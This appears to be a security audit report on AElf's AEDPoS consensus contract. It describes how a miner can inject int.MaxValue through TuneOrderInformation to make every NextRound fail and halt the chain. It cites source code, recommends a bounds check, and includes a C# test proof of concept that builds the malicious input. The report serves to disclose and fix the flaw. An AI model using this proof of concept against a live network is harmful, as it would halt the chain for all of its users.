# Audit Report

## Title
Consensus Halt via Malicious TuneOrderInformation in UpdateValue

## Summary
A malicious miner can inject arbitrary values (e.g., `int.MaxValue`) into the `TuneOrderInformation` field during their `UpdateValue` transaction, corrupting the `FinalOrderOfNextRound` state. This causes all subsequent `NextRound` transactions to fail validation, permanently halting consensus as all miners deterministically generate the same invalid next round from the corrupted state.

## Finding Description

The vulnerability exists in the consensus update flow where miners submit `UpdateValueInput` during their time slots. The protocol allows miners to tune the mining order for the next round via the `TuneOrderInformation` field, but this field lacks bounds validation.

**Root Cause:** The `ProcessUpdateValue` method directly iterates over `updateValueInput.TuneOrderInformation` and assigns arbitrary values to `currentRound.RealTimeMinersInformation[tuneOrder.Key].FinalOrderOfNextRound` without validating that these values are within the valid range of `[1, minersCount]`. [1](#0-0) 

The `TuneOrderInformation` field is defined as a `map<string, int32>` allowing any 32-bit integer value. [2](#0-1) 

**Missing Validation:** The `UpdateValueValidationProvider` only validates that `OutValue` and `Signature` are filled and checks `PreviousInValue` correctness. It does not validate the values in `TuneOrderInformation`. [3](#0-2) 

**Propagation to Next Round:** When generating the next round, the code uses `FinalOrderOfNextRound` from miners who mined in the current round as the `Order` in the next round, and calculates `ExpectedMiningTime` as `currentBlockTimestamp.AddMilliseconds(miningInterval.Mul(order))`. If `FinalOrderOfNextRound = int.MaxValue`, the `ExpectedMiningTime` becomes extremely far in the future due to integer overflow. [4](#0-3) 

**Validation Failure:** The `TimeSlotValidationProvider` is always added to the validation pipeline for all consensus behaviors. [5](#0-4) 

When any miner attempts to create a `NextRound` transaction, this provider calls `CheckRoundTimeSlots()` for new rounds (when RoundId changes). [6](#0-5) 

The `CheckRoundTimeSlots` method orders miners by `Order` and validates that consecutive miners have similar time intervals. With a miner having `Order = int.MaxValue` and extreme `ExpectedMiningTime`, the interval calculations fail validation. [7](#0-6) 

**Attack Execution Path:**
1. Malicious miner calls `UpdateValue` with `TuneOrderInformation = {"targetMinerPubkey": int.MaxValue}`
2. State is corrupted as `FinalOrderOfNextRound` is set to `int.MaxValue` without validation
3. When the round needs to transition, all miners deterministically generate the same next round using `GenerateNextRoundInformation`
4. All `NextRound` transactions fail validation at `CheckRoundTimeSlots()` with message "Time slots are so different"
5. No miner can successfully produce a valid `NextRound` block - **consensus permanently halts**

## Impact Explanation

This is a **CRITICAL** vulnerability causing complete network failure:

**Consensus Halt:**
- Once `FinalOrderOfNextRound` is corrupted, the current round state is permanently damaged
- All miners deterministically generate the same invalid next round from the corrupted state
- All `NextRound` transactions fail validation - no exception or recovery path exists
- The blockchain cannot progress beyond the current round

**Network-Wide Impact:**
- All users unable to submit transactions
- All applications relying on the chain become non-functional
- Cross-chain operations halt
- Economic activity stops completely

**Recovery Requirements:**
- Requires coordinated hard fork to manually correct the state
- No automatic recovery mechanism exists
- Significant coordination effort across all validators and ecosystem participants

This vulnerability is more severe than fund theft because it affects the entire network's availability, not just individual balances.

## Likelihood Explanation

**Likelihood: HIGH** - This attack is trivially executable by any active miner:

**Attacker Requirements:**
- Must be an active miner in the current round (one of the selected block producers)
- No special privileges beyond normal miner status required

**Attack Complexity:**
- **Trivial execution**: Single transaction with modified `TuneOrderInformation` field
- No timing constraints or race conditions needed
- No need to compromise other miners or coordinate attacks

**Authorization Check:** The `PreCheck()` method only verifies the sender is in the current or previous miner list - no additional authorization or validation exists. [8](#0-7) 

**Economic Considerations:**
- Zero additional cost (normal mining transaction)
- Could be executed by disgruntled miner, competitor, or any attacker who gained miner status through normal means
- High impact with minimal investment makes this attractive for malicious actors

**Detection:** The attack is not detectable until the `NextRound` transition fails, by which point the state is already corrupted.

## Recommendation

Add validation in `ProcessUpdateValue` to ensure all `TuneOrderInformation` values are within the valid range `[1, minersCount]`:

```csharp
private void ProcessUpdateValue(UpdateValueInput updateValueInput)
{
    TryToGetCurrentRoundInformation(out var currentRound);
    var minersCount = currentRound.RealTimeMinersInformation.Count;
    
    // Validate TuneOrderInformation values
    foreach (var tuneOrder in updateValueInput.TuneOrderInformation)
    {
        Assert(tuneOrder.Value >= 1 && tuneOrder.Value <= minersCount, 
            $"Invalid tune order value: {tuneOrder.Value}. Must be between 1 and {minersCount}.");
        Assert(currentRound.RealTimeMinersInformation.ContainsKey(tuneOrder.Key),
            $"Invalid miner public key in tune order information: {tuneOrder.Key}");
    }
    
    // Rest of the method...
}
```

Additionally, consider adding validation in `UpdateValueValidationProvider` to check `TuneOrderInformation` as a defense-in-depth measure.

## Proof of Concept

The PoC demonstrates creating a malicious `UpdateValue` transaction with `TuneOrderInformation` containing `int.MaxValue`, which corrupts the state and causes subsequent `NextRound` validation to fail:

```csharp
[Fact]
public async Task ConsensusHalt_Via_MaliciousTuneOrder_Test()
{
    // Initialize with valid miners
    await InitializeCandidates(3);
    var firstRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    
    // First miner produces valid UpdateValue
    var miner1 = InitialCoreDataCenterKeyPairs[0];
    var miner1Stub = GetAEDPoSContractStub(miner1);
    var miner1Info = firstRound.RealTimeMinersInformation[miner1.PublicKey.ToHex()];
    
    // Craft malicious UpdateValue with int.MaxValue in TuneOrderInformation
    var maliciousUpdate = new UpdateValueInput
    {
        RoundId = firstRound.RoundId,
        OutValue = HashHelper.ComputeFrom("test"),
        Signature = HashHelper.ComputeFrom("sig"),
        PreviousInValue = Hash.Empty,
        ActualMiningTime = miner1Info.ExpectedMiningTime,
        SupposedOrderOfNextRound = 1,
        TuneOrderInformation = 
        {
            { InitialCoreDataCenterKeyPairs[1].PublicKey.ToHex(), int.MaxValue }
        },
        RandomNumber = ByteString.CopyFrom(await GenerateRandomProofAsync(miner1))
    };
    
    // UpdateValue succeeds - no validation on TuneOrderInformation!
    var result = await miner1Stub.UpdateValue.SendAsync(maliciousUpdate);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify state corruption
    var corruptedRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    corruptedRound.RealTimeMinersInformation[InitialCoreDataCenterKeyPairs[1].PublicKey.ToHex()]
        .FinalOrderOfNextRound.ShouldBe(int.MaxValue);
    
    // Try to produce NextRound - should fail validation
    BlockTimeProvider.SetBlockTime(miner1Info.ExpectedMiningTime.AddSeconds(100));
    var nextRoundInfo = await AEDPoSContractStub.GetConsensusExtraData.CallAsync(
        new AElfConsensusTriggerInformation
        {
            Behaviour = AElfConsensusBehaviour.NextRound,
            Pubkey = ByteString.CopyFrom(miner1.PublicKey)
        }.ToBytesValue());
    
    var nextRoundInput = NextRoundInput.Parser.ParseFrom(nextRoundInfo.ToByteArray());
    nextRoundInput.RandomNumber = ByteString.CopyFrom(await GenerateRandomProofAsync(miner1));
    
    // NextRound fails validation - consensus halted!
    var nextRoundResult = await miner1Stub.NextRound.SendAsync(nextRoundInput);
    nextRoundResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Failed);
    nextRoundResult.TransactionResult.Error.ShouldContain("Time slots are so different");
}
```

## Notes

The vulnerability exists because the consensus protocol allows miners to coordinate the mining order for the next round through `TuneOrderInformation`, but this mechanism lacks proper bounds validation. While the `ApplyNormalConsensusData` method includes bounds checking logic for the initially calculated order, the `TuneOrderInformation` values bypass this protection by being directly assigned after initialization. [9](#0-8) 

The `ExtractInformationToUpdateConsensus` method shows the intended use of `TuneOrderInformation` - to communicate differences between `FinalOrderOfNextRound` and `SupposedOrderOfNextRound` for conflict resolution. However, there's no enforcement that these values are within valid bounds. [10](#0-9) 

This is a fundamental design flaw in the consensus validation pipeline that allows state corruption leading to permanent network halt.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L259-260)
```csharp
        foreach (var tuneOrder in updateValueInput.TuneOrderInformation)
            currentRound.RealTimeMinersInformation[tuneOrder.Key].FinalOrderOfNextRound = tuneOrder.Value;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L316-331)
```csharp
    private bool PreCheck()
    {
        TryToGetCurrentRoundInformation(out var currentRound);
        TryToGetPreviousRoundInformation(out var previousRound);

        _processingBlockMinerPubkey = Context.RecoverPublicKey().ToHex();

        // Though we've already prevented related transactions from inserting to the transaction pool
        // via ConstrainedAEDPoSTransactionValidationProvider,
        // this kind of permission check is still useful.
        if (!currentRound.IsInMinerList(_processingBlockMinerPubkey) &&
            !previousRound.IsInMinerList(_processingBlockMinerPubkey)) // Case a failed miner performing NextTerm
            return false;

        return true;
    }
```

**File:** protobuf/aedpos_contract.proto (L208-208)
```text
    map<string, int32> tune_order_information = 7;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/UpdateValueValidationProvider.cs (L12-19)
```csharp
        // Only one Out Value should be filled.
        if (!NewConsensusInformationFilled(validationContext))
            return new ValidationResult { Message = "Incorrect new Out Value." };

        if (!ValidatePreviousInValue(validationContext))
            return new ValidationResult { Message = "Incorrect previous in value." };

        return new ValidationResult { Success = true };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L26-36)
```csharp
        foreach (var minerInRound in minersMinedCurrentRound.OrderBy(m => m.FinalOrderOfNextRound))
        {
            var order = minerInRound.FinalOrderOfNextRound;
            nextRound.RealTimeMinersInformation[minerInRound.Pubkey] = new MinerInRound
            {
                Pubkey = minerInRound.Pubkey,
                Order = order,
                ExpectedMiningTime = currentBlockTimestamp.AddMilliseconds(miningInterval.Mul(order)),
                ProducedBlocks = minerInRound.ProducedBlocks,
                MissedTimeSlots = minerInRound.MissedTimeSlots
            };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L65-75)
```csharp
        var validationProviders = new List<IHeaderInformationValidationProvider>
        {
            // Is sender in miner list (of base round)?
            new MiningPermissionValidationProvider(),

            // Is this block produced in proper time?
            new TimeSlotValidationProvider(),

            // Is sender produced too many blocks at one time?
            new ContinuousBlocksValidationProvider()
        };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/TimeSlotValidationProvider.cs (L14-18)
```csharp
        if (validationContext.ProvidedRound.RoundId != validationContext.BaseRound.RoundId)
        {
            // Is new round information fits time slot rule?
            validationResult = validationContext.ProvidedRound.CheckRoundTimeSlots();
            if (!validationResult.Success) return validationResult;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L33-57)
```csharp
    public ValidationResult CheckRoundTimeSlots()
    {
        var miners = RealTimeMinersInformation.Values.OrderBy(m => m.Order).ToList();
        if (miners.Count == 1)
            // No need to check single node.
            return new ValidationResult { Success = true };

        if (miners.Any(m => m.ExpectedMiningTime == null))
            return new ValidationResult { Message = $"Incorrect expected mining time.\n{this}" };

        var baseMiningInterval =
            (miners[1].ExpectedMiningTime - miners[0].ExpectedMiningTime).Milliseconds();

        if (baseMiningInterval <= 0)
            return new ValidationResult { Message = $"Mining interval must greater than 0.\n{this}" };

        for (var i = 1; i < miners.Count - 1; i++)
        {
            var miningInterval =
                (miners[i + 1].ExpectedMiningTime - miners[i].ExpectedMiningTime).Milliseconds();
            if (Math.Abs(miningInterval - baseMiningInterval) > baseMiningInterval)
                return new ValidationResult { Message = "Time slots are so different." };
        }

        return new ValidationResult { Success = true };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_ApplyNormalConsensusData.cs (L18-44)
```csharp
        var minersCount = RealTimeMinersInformation.Count;
        var sigNum = signature.ToInt64();

        var supposedOrderOfNextRound = GetAbsModulus(sigNum, minersCount) + 1;

        // Check the existence of conflicts about OrderOfNextRound.
        // If so, modify others'.
        var conflicts = RealTimeMinersInformation.Values
            .Where(i => i.FinalOrderOfNextRound == supposedOrderOfNextRound).ToList();

        foreach (var orderConflictedMiner in conflicts)
            // Multiple conflicts is unlikely.

            for (var i = supposedOrderOfNextRound + 1; i < minersCount * 2; i++)
            {
                var maybeNewOrder = i > minersCount ? i % minersCount : i;
                if (RealTimeMinersInformation.Values.All(m => m.FinalOrderOfNextRound != maybeNewOrder))
                {
                    RealTimeMinersInformation[orderConflictedMiner.Pubkey].FinalOrderOfNextRound =
                        maybeNewOrder;
                    break;
                }
            }

        RealTimeMinersInformation[pubkey].SupposedOrderOfNextRound = supposedOrderOfNextRound;
        // Initialize FinalOrderOfNextRound as the value of SupposedOrderOfNextRound
        RealTimeMinersInformation[pubkey].FinalOrderOfNextRound = supposedOrderOfNextRound;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_ExtractInformationToUpdateConsensus.cs (L22-24)
```csharp
        var tuneOrderInformation = RealTimeMinersInformation.Values
            .Where(m => m.FinalOrderOfNextRound != m.SupposedOrderOfNextRound)
            .ToDictionary(m => m.Pubkey, m => m.FinalOrderOfNextRound);
```
